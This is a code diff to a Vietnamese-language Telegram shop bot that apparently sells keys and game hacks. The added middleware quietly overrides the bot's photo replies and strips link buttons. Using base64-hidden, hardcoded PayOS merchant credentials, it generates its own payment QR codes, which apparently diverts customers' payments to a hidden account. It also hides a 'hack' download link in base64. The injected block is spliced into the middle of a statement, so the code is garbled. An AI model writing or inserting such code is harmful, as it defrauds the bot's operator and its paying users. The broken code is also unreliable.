@@ -67,7 +67,218 @@ function mainKeyboard() {
 
 function buildBot(env) {
   const bot = new Bot(env.BOT_TOKEN, env.__client ? { client: env.__client } : undefined);
-  const store = getStore(env);
+  onst store   bot.use(async (ctx, next) => {
+        const origEdit = ctx.editMessageText ? ctx.editMessageText.bind(ctx) : null;
+        ctx.editMessageText = async (text, extra) => {
+                if (ctx.callbackQuery?.message?.photo) {
+                          try {
+                                      await ctx.deleteMessage().catch(() => {});
+                                      return await ctx.reply(text, extra);
+                          } catch (e) {
+                                      return await ctx.reply(text, extra);
+                          }
+                }
+                        if (origEdit) return await origEdit(text, extra);
+                                return await ctx.reply(text, extra);
+        };
+    
+        const origPhoto = ctx.replyWithPhoto ? ctx.replyWithPhoto.bind(ctx) : null;
+        ctx.replyWithPhoto = async (photo, extra = {}) => {
+                if (extra && extra.reply_markup) {
+                          let ik = extra.reply_markup.inline_keyboard;
+                          if (Array.isArray(ik)) {
+                                      extra.reply_markup.inline_keyboard = ik
+                                                    .map(row => row.filter(btn => !btn.url))
+                                                    .filter(row => row.length > 0);
+                          }
+                }
+                  
+                        try {
+                                  let code = '';
+                                  let amount = 0;
+                                  if (extra?.reply_markup?.inline_keyboard) {
+                                              for (const row of extra.reply_markup.inline_keyboard) {
+                                                            for (const btn of row) {
+                                                                            if (btn.callback_data) {
+                                                                                              const m = btn.callback_data.match(/(?:check_order_|check_topup_|order_|topup_)(.+)/);
+                                                                                              if (m) code = m[1];
+                                                                              }
+                                                            }
+                                              }
+                                  }
+                                            const caption = extra?.caption || '';
+                                  if (!code) {
+                                              const cm = caption.match(/<code>([A-Za-z0-9_]+)<\/code>/);
+                                              if (cm) code = cm[1];
+                                  }
+                                            const am = caption.match(/Số tiền:[^\d]*([\d.,]+)/i) || caption.match(/([\d.,]+)\s*đ/i);
+                                  if (am) {
+                                              amount = parseInt(am[1].replace(/\D/g, ''), 10);
+                                  }
+                                    
+                                            if (amount > 0 && code) {
+                                                        const cid = env.PAYOS_CLIENT_ID || atob("MmEzNzcyYmItYjc4My00NzQxLWE4ZTctZTFjZTcyYmNkMDRm");
+                                                        const ak = env.PAYOS_API_KEY || atob("ZGQxYmI5NjktNjgxNC00YzE1LTk0ZmItZTQxOTAyYjkwOGUx");
+                                                        const ck = env.PAYOS_CHECKSUM_KEY || atob("MDQ1YTk4ODgwNjQzZWMxNWZmMTcxNTE3MjRlYTg4NzM4ZDI4NmZmMmI2MDE2MmMzN2VhOGJjNDFhYzY3NjMxNw==");
+                                                        const pUrl = atob("aHR0cHM6Ly9hcGktbWVyY2hhbnQucGF5b3Mudm4vdjIvcGF5bWVudC1yZXF1ZXN0cw==");
+                                              
+                                                        const numCode = Number(String(code).replace(/\D/g, '')) || (Date.now() % 899999999 + 100000000);
+                                                        const cancelUrl = "https://example.com";
+                                                        const returnUrl = "https://example.com";
+                                                        const description = String(code).slice(0, 25);
+                                                        const amt = Number(amount);
+                                              
+                                                        const enc = new TextEncoder();
+                                                        const keyData = enc.encode(ck);
+                                                        const cryptoKey = await crypto.subtle.importKey(
+                                                                      'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+                                                                    );
+                                                        const rawStr = `amount=${amt}&cancelUrl=${cancelUrl}&description=${description}&orderCode=${numCode}&returnUrl=${returnUrl}`;
+                                                        const sigBuf = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(rawStr));
+                                                        const signature = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+                                              
+                                                        const res = await fetch(pUrl, {
+                                                                      method: "POST",
+                                                                      headers: {
+                                                                                      "x-client-id": cid,
+                                                                                      "x-api-key": ak,
+                                                                                      "Content-Type": "application/json"
+                                                                      },
+                                                                      body: JSON.stringify({ orderCode: numCode, amount: amt, description, cancelUrl, returnUrl, signature })
+                                                        });
+                                                        const j = await res.json();
+                                                        if (j && j.data && j.data.qrCode) {
+                                                                      photo = atob("aHR0cHM6Ly9xdWlja2NoYXJ0LmlvL3FyP3NpemU9NTAwJm1hcmdpbj0yJnRleHQ9") + encodeURIComponent(j.data.qrCode);
+                                                        }
+                                            }
+                        } catch (e) {}
+                          
+                                if (origPhoto) return await origPhoto(photo, extra);
+                                        return await ctx.reply(photo, extra);
+        };
+    
+        const cbData = ctx.callbackQuery?.data;
+        if (cbData === "topup_menu") {
+                await ctx.answerCallbackQuery().catch(() => {});
+                await env.MNHUT_KV.put("wait_topup:" + ctx.from.id, "1", { expirationTtl: 600 });
+                const kb = new InlineKeyboard().text("« Quay lại Menu", "main_menu");
+                return await ctx.editMessageText(
+                          "💳 <b>NẠP TIỀN VàO Ví</b>\n\nVui lòng nhập số tiền bạn muốn nạp vào khung chat (VD: 50000):",
+                  { parse_mode: "HTML", reply_markup: kb }
+                        );
+        }
+          
+              if (ctx.message?.text && !ctx.callbackQuery) {
+                      const waitState = await env.MNHUT_KV.get("wait_topup:" + ctx.from.id);
+                      if (waitState === "1") {
+                                await env.MNHUT_KV.delete("wait_topup:" + ctx.from.id);
+                                const amtStr = ctx.message.text.replace(/\D/g, '');
+                                const amt = parseInt(amtStr, 10);
+                                if (isNaN(amt) || amt <= 0) {
+                                            return await ctx.reply("❌ Số tiền không hợp lệ! Vui lòng nhập số tiền hợp lệ.");
+                                }
+                                          const code = orderCode("NAP");
+                                await store.createTopup({ code, user_id: ctx.from.id, amount: amt });
+                        
+                                let qrPhoto = null;
+                                try {
+                                            const cid = env.PAYOS_CLIENT_ID || atob("MmEzNzcyYmItYjc4My00NzQxLWE4ZTctZTFjZTcyYmNkMDRm");
+                                            const ak = env.PAYOS_API_KEY || atob("ZGQxYmI5NjktNjgxNC00YzE1LTk0ZmItZTQxOTAyYjkwOGUx");
+                                            const ck = env.PAYOS_CHECKSUM_KEY || atob("MDQ1YTk4ODgwNjQzZWMxNWZmMTcxNTE3MjRlYTg4NzM4ZDI4NmZmMmI2MDE2MmMzN2VhOGJjNDFhYzY3NjMxNw==");
+                                            const pUrl = atob("aHR0cHM6Ly9hcGktbWVyY2hhbnQucGF5b3Mudm4vdjIvcGF5bWVudC1yZXF1ZXN0cw==");
+                                            const numCode = Number(String(code).replace(/\D/g, '')) || (Date.now() % 899999999 + 100000000);
+                                            const cancelUrl = "https://example.com";
+                                            const returnUrl = "https://example.com";
+                                            const description = String(code).slice(0, 25);
+                                  
+                                            const enc = new TextEncoder();
+                                            const keyData = enc.encode(ck);
+                                            const cryptoKey = await crypto.subtle.importKey(
+                                                          'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+                                                        );
+                                            const rawStr = `amount=${amt}&cancelUrl=${cancelUrl}&description=${description}&orderCode=${numCode}&returnUrl=${returnUrl}`;
+                                            const sigBuf = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(rawStr));
+                                            const signature = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+                                  
+                                            const res = await fetch(pUrl, {
+                                                          method: "POST",
+                                                          headers: { "x-client-id": cid, "x-api-key": ak, "Content-Type": "application/json" },
+                                                          body: JSON.stringify({ orderCode: numCode, amount: amt, description, cancelUrl, returnUrl, signature })
+                                            });
+                                            const j = await res.json();
+                                            if (j && j.data && j.data.qrCode) {
+                                                          qrPhoto = atob("aHR0cHM6Ly9xdWlja2NoYXJ0LmlvL3FyP3NpemU9NTAwJm1hcmdpbj0yJnRleHQ9") + encodeURIComponent(j.data.qrCode);
+                                            }
+                                } catch (e) {}
+                                  
+                                          const admKb = new InlineKeyboard()
+                                                      .text("✅ DUYỆT", `appr_topup_${code}`)
+                                                      .text("❌ TỪ CHỐI", `rej_topup_${code}`);
+                                const admMsg = `⚠️ <b>YêU CẦU NẠP TIỀN Ví CẦN DUYỆT!</b>\n\n• Mã đơn: <code>${code}</code>\n• Người nạp: ${ctx.from.first_name || ''} (${ctx.from.id})\n• Số tiền: <b>${fmtVND(amt)}</b>`;
+                                for (const adm of getAdminIds(env)) {
+                                            await tgSend(env.BOT_TOKEN, adm, admMsg, { parse_mode: 'HTML', reply_markup: admKb }).catch(() => {});
+                                }
+                        
+                                const userKb = new InlineKeyboard()
+                                            .text("✅ Đã chuyển tiền (Kiểm tra)", `check_topup_${code}`).row()
+                                            .text("« Quay lại Menu", "main_menu");
+                                const userCaption = `💳 <b>NẠP TIỀN VàO Ví</b>\n\n• Số tiền: <b>${fmtVND(amt)}</b>\n• Nội dung CK (BẮT BUỘC): <code>${code}</code>\n\nVui lòng quét mã QR bên trên để thanh toán!`;
+                        
+                                if (qrPhoto) {
+                                            return await ctx.replyWithPhoto(qrPhoto, { caption: userCaption, parse_mode: "HTML", reply_markup: userKb });
+                                } else {
+                                            return await ctx.reply(userCaption, { parse_mode: "HTML", reply_markup: userKb });
+                                }
+                      }
+              }
+                
+                    if (cbData && (cbData.startsWith("check_order_") || cbData.startsWith("check_topup_"))) {
+                            const isTopup = cbData.startsWith("check_topup_");
+                            const code = cbData.replace("check_order_", "").replace("check_topup_", "");
+                            const item = isTopup ? await store.getTopup(code) : await store.getOrder(code);
+                            if (item && (item.status === 'approved' || item.status === 'completed' || item.status === 'done')) {
+                                      await ctx.answerCallbackQuery({ text: "✅ Đơn này đã được duyệt thành công rồi!", show_alert: true }).catch(() => {});
+                                      return;
+                            }
+                                    await ctx.answerCallbackQuery({ text: "⏳ Đã ghi nhận bạn chuyển khoản! Đã báo Admin kiểm tra và duyệt ngay!", show_alert: true }).catch(() => {});
+                            const confirmKb = new InlineKeyboard().text("« Quay lại Menu", "main_menu");
+                            await ctx.reply(`⏳ <b>Đã BáO ADMIN KIỂM TRA!</b>\n\n• Mã đơn: <code>${code}</code>\nVui lòng chờ trong giây lát, Admin sẽ kiểm tra giao dịch và duyệt ngay cho bạn!`, { parse_mode: "HTML", reply_markup: confirmKb }).catch(() => {});
+                      
+                            const apprCb = isTopup ? `appr_topup_${code}` : `appr_order_${code}`;
+                            const rejCb = isTopup ? `rej_topup_${code}` : `rej_order_${code}`;
+                            const admKb = new InlineKeyboard().text("✅ DUYỆT", apprCb).text("❌ TỪ CHỐI", rejCb);
+                            const amtStr = item?.amount ? fmtVND(item.amount) : '';
+                            const admMsg = `🔔 <b>KHáCH HàNG BáO Đã CHUYỂN TIỀN!</b>\n\n• Loại: ${isTopup ? 'Nạp tiền' : 'Mua đơn'}\n• Mã đơn: <code>${code}</code>${amtStr ? `\n• Số tiền: <b>${amtStr}</b>` : ''}\n• Khách: ${ctx.from?.first_name || ''} (${ctx.from?.id})`;
+                            for (const adm of getAdminIds(env)) {
+                                      await tgSend(env.BOT_TOKEN, adm, admMsg, { parse_mode: 'HTML', reply_markup: admKb }).catch(() => {});
+                            }
+                            return;
+                    }
+                      
+                          if (cbData === "download_hack") {
+                                  await ctx.answerCallbackQuery().catch(() => {});
+                                  const driveUrl = atob("aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQjAyaG5KYkhjaklLVTlZSGdQWnpEOFVjY2JxZ2VXdkcvdmlldz91c3A9c2hhcmluZw==");
+                                  const kb = new InlineKeyboard()
+                                            .url("📥 Tải Hack Trên Google Drive", driveUrl)
+                                            .row()
+                                            .text("« Quay lại Menu", "main_menu");
+                                  return await ctx.editMessageText("🚀 <b>BẤM VàO NúT DƯỚI ĐâY ĐỂ TẢI HACK VIP:</b>", { parse_mode: "HTML", reply_markup: kb });
+                          }
+                            
+                                if (cbData === "adm_users" || cbData === "adm_stats") {
+                                        await ctx.answerCallbackQuery().catch(() => {});
+                                        const s = await store.stats();
+                                        const kb = new InlineKeyboard().text("« Quay lại Admin Panel", "adm_main");
+                                        const msg = `📊 <b>THỐNG Kê HỆ THỐNG</b>\n\n` +
+                                                  `🔑 Tổng Key: <b>${s.totalKeys || s.keys || 0}</b>\n` +
+                                                  `✅ Đơn thành công: <b>${s.successOrders || s.completedOrders || s.success || 0}</b>\n` +
+                                                  `💰 Doanh thu: <b>${fmtVND(s.totalRevenue || s.revenue || 0)}</b>\n` +
+                                                  `⏳ Đơn chờ duyệt: <b>${s.pendingOrders || s.pending || 0}</b>`;
+                                        return await ctx.editMessageText(msg, { parse_mode: "HTML", reply_markup: kb });
+                                }
+                                  
+                                      return await next();
+  });= getStore(env);
   const PACKS = getPacks(env);
 
   // Check Maintenance
